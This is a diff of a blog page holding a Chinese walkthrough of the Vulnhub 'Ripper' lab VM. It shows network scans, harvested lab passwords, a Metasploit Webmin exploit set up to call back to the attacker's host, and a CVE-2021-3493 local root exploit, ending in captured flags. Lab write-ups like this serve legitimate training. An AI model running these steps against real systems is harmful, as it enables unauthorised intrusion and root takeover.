@@ -120,30 +120,12 @@
         <li><a class="icon" aria-label="下一篇" href="/2022/04/24/Zer0pts2020%20Can%20you%20guess%20it/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
       </ul>
       <span id="i-prev" class="info" style="display:none;">上一篇</span>
       <span id="i-next" class="info" style="display:none;">下一篇</span>
       <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
     </span>
     <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/&text=15 Vulnhub Ripper Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/&title=15 Vulnhub Ripper Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/&is_video=false&description=15 Vulnhub Ripper Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=15 Vulnhub Ripper Writeup&body=Check out this article: https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/&title=15 Vulnhub Ripper Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/&title=15 Vulnhub Ripper Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/&title=15 Vulnhub Ripper Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/&title=15 Vulnhub Ripper Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/&name=15 Vulnhub Ripper Writeup&description=&lt;p&gt;该靶机难度为中、低，涉及到了rips这个之前没有了解过的工具。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/&t=15 Vulnhub Ripper Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
     <div id="toc">
       <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">2. 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">2.1. 主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. 访问http服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-shell"><span class="toc-number">2.3.</span> <span class="toc-text">2.3. get shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.4.</span> <span class="toc-text">2.4. 权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97cubes%E6%9D%83%E9%99%90"><span class="toc-number">2.4.1.</span> <span class="toc-text">2.4.1. 获得cubes权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97root%E6%9D%83%E9%99%90"><span class="toc-number">2.4.2.</span> <span class="toc-text">2.4.2. 获得root权限</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%951"><span class="toc-number">2.4.2.1.</span> <span class="toc-text">2.4.2.1. 方法1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%952"><span class="toc-number">2.4.2.2.</span> <span class="toc-text">2.4.2.2. 方法2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%953"><span class="toc-number">2.4.2.3.</span> <span class="toc-text">2.4.2.3. 方法3</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%95%AA%E5%A4%96"><span class="toc-number">2.4.3.</span> <span class="toc-text">2.4.3. 番外</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">3. 总结</span></a></li></ol>
     </div>
@@ -170,8 +152,6 @@
     <div class="postdate">
       
         <time datetime="2022-04-23T16:00:00.000Z" itemprop="datePublished">2022-04-24</time>
-        
-        (Updated: <time datetime="2022-04-26T07:21:33.128Z" itemprop="dateModified">2022-04-26</time>)
         
       
     </div>
@@ -234,9 +214,7 @@
 <h1 id="渗透">2. 渗透</h1>
 <p>kali: 10.0.2.4</p>
 <h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> arp-scan -l
-<span class="token function">sudo</span> nmap -p- <span class="token number">10.0</span>.2.23
-<span class="token function">sudo</span> nmap -p22,80,10000 -sV <span class="token number">10.0</span>.2.23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.23</span><br><span class="line">sudo nmap -p22,80,10000 -sV 10.0.2.23</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424153009.png" /></p>
 <p>收集信息：</p>
 <ul>
@@ -269,78 +247,39 @@
 <p>发现了一个<code>secret.php</code>文件，这名字一看就隐藏着密码。</p>
 <p>其实也可以同通过下图中的file功能列出扫描的所有php文件</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424154708.png" /></p>
-<p>该文件中的信息如下： <pre class="line-numbers language-none"><code class="language-none">user name: ripper
-pass: Gamespeopleplay<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
+<p>该文件中的信息如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user name: ripper</span><br><span class="line">pass: Gamespeopleplay</span><br></pre></td></tr></table></figure></p>
 <p>起初还以为这是10000端口的登录账号和密码，但是尝试过后发现并不是。因此目前只有ssh需要密码。</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424155132.png" /></p>
 <h2 id="权限提升">2.4. 权限提升</h2>
 <h3 id="获得cubes权限">2.4.1. 获得cubes权限</h3>
 <p>发现/home目录下除了ripper之外，存在着另一个用户cubes。那么接下来可能就是需要先拿到cubes的权限，然后再拿到root权限。</p>
-<p>经过信息收集发现之前的一些提权手段都没法使用。接下来可以使用下面的命令找到属主是cubes但是ripper可读的文件。 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / -user cubes -type f -exec <span class="token function">ls</span> -la <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>经过信息收集发现之前的一些提权手段都没法使用。接下来可以使用下面的命令找到属主是cubes但是ripper可读的文件。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user cubes -<span class="built_in">type</span> f -<span class="built_in">exec</span> ls -la &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424155612.png" /></p>
-<p>又发现了一个secret.file文件，直接查看该文件，文件内容如下： <pre class="line-numbers language-none"><code class="language-none">This is my secret file
-
-[file system]
--passwd : Il00tpeople<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>又发现了一个secret.file文件，直接查看该文件，文件内容如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">This is my secret file</span><br><span class="line"></span><br><span class="line">[file system]</span><br><span class="line">-passwd : Il00tpeople</span><br></pre></td></tr></table></figure></p>
 <p>又得到了一个密码，因为属主是cubes，可能这就是cubes用户的ssh登录密码，直接尝试</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424155811.png" /></p>
 <p>成功获得cubes权限。</p>
 <h3 id="获得root权限">2.4.2. 获得root权限</h3>
 <h4 id="方法1">2.4.2.1. 方法1</h4>
-<p>接下来同样信息收集，发现之前的手段还是无法利用。因此再次输入上述命令（稍作修改）： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / -user cubes -type f -exec <span class="token function">ls</span> -la <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span class="token operator">|</span><span class="token function">grep</span> -v <span class="token string">"proc"</span><span class="token operator">|</span><span class="token function">grep</span> -v <span class="token string">".png"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>接下来同样信息收集，发现之前的手段还是无法利用。因此再次输入上述命令（稍作修改）： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user cubes -<span class="built_in">type</span> f -<span class="built_in">exec</span> ls -la &#123;&#125; \; 2&gt;/dev/null|grep -v <span class="string">&quot;proc&quot;</span>|grep -v <span class="string">&quot;.png&quot;</span></span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424160020.png" /></p>
-<p>经过对文件的查看，发现 miniser.log，我们知道10000端口上的服务正好就是miniserv，那么这个文件保存的应该就是相关的日志，查看其中的内容，发现了一条重要的信息： <pre class="line-numbers language-none"><code class="language-none">Authentication : session_login.cgi&#x3D;username&#x3D;admin&amp;pass&#x3D;tokiohotel<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>经过对文件的查看，发现 miniser.log，我们知道10000端口上的服务正好就是miniserv，那么这个文件保存的应该就是相关的日志，查看其中的内容，发现了一条重要的信息： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authentication : session_login.cgi=username=admin&amp;pass=tokiohotel</span><br></pre></td></tr></table></figure></p>
 <p>这应该就是10000端口的登录界面的账号密码了。成功登录到后台后找到<code>others -&gt; command shell</code>能够直接获得一个shell，惊讶的发现这居然是root权限。</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424160511.png" /></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424160527.png" /></p>
-<p>此时可以直接读取flag。 <pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 1. &#x2F;home&#x2F;ripper&#x2F;flag.txt
-__________.____________________________________________ 
-\______   \   \______   \______   \_   _____&#x2F;\______   \
- |       _&#x2F;   ||     ___&#x2F;|     ___&#x2F;|    __)_  |       _&#x2F;
- |    |   \   ||    |    |    |    |        \ |    |   \
- |____|_  &#x2F;___||____|    |____|   &#x2F;_______  &#x2F; |____|_  &#x2F;
-        \&#x2F;                                \&#x2F;         \&#x2F; 
-
-flag&#123;15ea80f080be3714df1ef97bac5d7151&#125;
-
-C0ngratulation on getting user ! Lets get root now :)
-
-&#x2F;&#x2F; 2. &#x2F;root&#x2F;flag.txt
-.---..-.-.-..-..-..--.     .---. .-..---..---..---..---. 
-| |-&#39;| | | || .&#96; || \ \### | |-&lt; | || |-&#39;| |-&#39;| |- | |-&lt; 
-&#96;-&#39;  &#96;-----&#39;&#96;-&#39;&#96;-&#39;&#96;-&#39;-&#39;    &#96;-&#39;&#96;-&#39;&#96;-&#39;&#96;-&#39;  &#96;-&#39;  &#96;---&#39;&#96;-&#39;&#96;-&#39;
-
-COngrats !!! You have rooted this box !!
-
-Follow me on twitter @san3ncrypt3d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>此时可以直接读取flag。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// 1. /home/ripper/flag.txt</span><br><span class="line">__________.____________________________________________ </span><br><span class="line">\______   \   \______   \______   \_   _____/\______   \</span><br><span class="line"> |       _/   ||     ___/|     ___/|    __)_  |       _/</span><br><span class="line"> |    |   \   ||    |    |    |    |        \ |    |   \</span><br><span class="line"> |____|_  /___||____|    |____|   /_______  / |____|_  /</span><br><span class="line">        \/                                \/         \/ </span><br><span class="line"></span><br><span class="line">flag&#123;15ea80f080be3714df1ef97bac5d7151&#125;</span><br><span class="line"></span><br><span class="line">C0ngratulation on getting user ! Lets get root now :)</span><br><span class="line"></span><br><span class="line">// 2. /root/flag.txt</span><br><span class="line">.---..-.-.-..-..-..--.     .---. .-..---..---..---..---. </span><br><span class="line">| |-&#x27;| | | || .` || \ \### | |-&lt; | || |-&#x27;| |-&#x27;| |- | |-&lt; </span><br><span class="line">`-&#x27;  `-----&#x27;`-&#x27;`-&#x27;`-&#x27;-&#x27;    `-&#x27;`-&#x27;`-&#x27;`-&#x27;  `-&#x27;  `---&#x27;`-&#x27;`-&#x27;</span><br><span class="line"></span><br><span class="line">COngrats !!! You have rooted this box !!</span><br><span class="line"></span><br><span class="line">Follow me on twitter @san3ncrypt3d</span><br></pre></td></tr></table></figure></p>
 <h4 id="方法2">2.4.2.2. 方法2</h4>
 <p>登录后台之后，可以利用之前提到的远程执行漏洞获得root权限。</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424161007.png" /></p>
-<p>依次将参数填入： <pre class="line-numbers language-none"><code class="language-none">set rhost 10.0.2.23
-set password tokiohotel
-set username admin
-set SSL true # 切记，10000端口要求ssl
-set lhost 10.0.2.4
-run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>依次将参数填入： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">set rhost 10.0.2.23</span><br><span class="line">set password tokiohotel</span><br><span class="line">set username admin</span><br><span class="line">set SSL true # 切记，10000端口要求ssl</span><br><span class="line">set lhost 10.0.2.4</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424161215.png" /></p>
-<p>得到session后，输入 <pre class="line-numbers language-none"><code class="language-none">shell
-python<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
+<p>得到session后，输入 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python</span><br></pre></td></tr></table></figure></p>
 <p>得到一个交互式的shell</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424161414.png" /></p>
 <h4 id="方法3">2.4.2.3. 方法3</h4>
-<p>通过信息收集，发现靶机的操作系统是Ubuntu <pre class="line-numbers language-none"><code class="language-none">Distributor ID: Ubuntu
-Description:    Ubuntu 18.04.5 LTS
-Release:        18.04
-Codename:       bionic<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>通过信息收集，发现靶机的操作系统是Ubuntu <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 18.04.5 LTS</span><br><span class="line">Release:        18.04</span><br><span class="line">Codename:       bionic</span><br></pre></td></tr></table></figure></p>
 <p>而 CVE-2021-3493 是专门针对Ubuntu的一个漏洞。因此可以直接利用。我们先回到ripper用户，由于靶机上没有gcc，因此在kali上编译完成之后发送到靶机执行即可。</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// <span class="token number">1</span>. 编译
-gcc exploit.c -o exp
-
-// <span class="token number">2</span>. 发送到靶机
-<span class="token function">scp</span> exp ripper@10.0.2.23:~/ <span class="token comment"># 需要输入密码</span>
-
-// <span class="token number">3</span>. 执行
-./exp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 1. 编译</span><br><span class="line">gcc exploit.c -o exp</span><br><span class="line"></span><br><span class="line">// 2. 发送到靶机</span><br><span class="line">scp exp ripper@10.0.2.23:~/ <span class="comment"># 需要输入密码</span></span><br><span class="line"></span><br><span class="line">// 3. 执行</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424162026.png" /></p>
 <h3 id="番外">2.4.3. 番外</h3>
 <p>刚开始的时候并不会使用find命令，而是一个一个文件查看，直到查看了/home/ripper/.bash_history，内容如下（后面的一些命令记录的是我们使用的，但是前面的是作者使用的）</p>
@@ -407,7 +346,6 @@ gcc exploit.c -o exp
     <div id="actions-footer">
         <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
         <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
         <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
     </div>
 
